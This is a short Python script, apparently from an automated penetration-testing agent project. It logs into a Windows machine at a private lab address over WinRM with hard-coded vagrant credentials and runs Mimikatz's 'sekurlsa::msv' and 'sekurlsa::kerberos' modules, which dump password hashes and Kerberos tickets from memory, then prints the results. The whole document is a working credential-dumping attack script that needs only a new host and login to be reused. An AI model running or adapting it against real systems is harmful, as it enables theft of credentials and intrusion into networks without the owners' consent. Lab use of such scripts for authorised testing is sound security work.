from pentest_agent.winrm_client import WinRMConnection

# Adjust creds & target
host = "192.168.56.108"
user = "vagrant"
password = "vagrant"

mimikatz_path = r"C:\Temp\mimikatz-master\x64\mimikatz.exe"

# Commands you want to run inside Mimikatz
commands = [
    "sekurlsa::msv",
    "sekurlsa::kerberos",
    "exit"
]

# Build the test command
full_cmd = (
    f'powershell -Command "& \'{mimikatz_path}\' '
    f'\'sekurlsa::msv\' \'sekurlsa::kerberos\' \'exit\'"'
)

print("[*] Running:", full_cmd)

conn = WinRMConnection(host=host, username=user, password=password)
result = conn.run_command(full_cmd)

print("=== STDOUT ===")
print(result["stdout"])
print("=== STDERR ===")
print(result["stderr"])
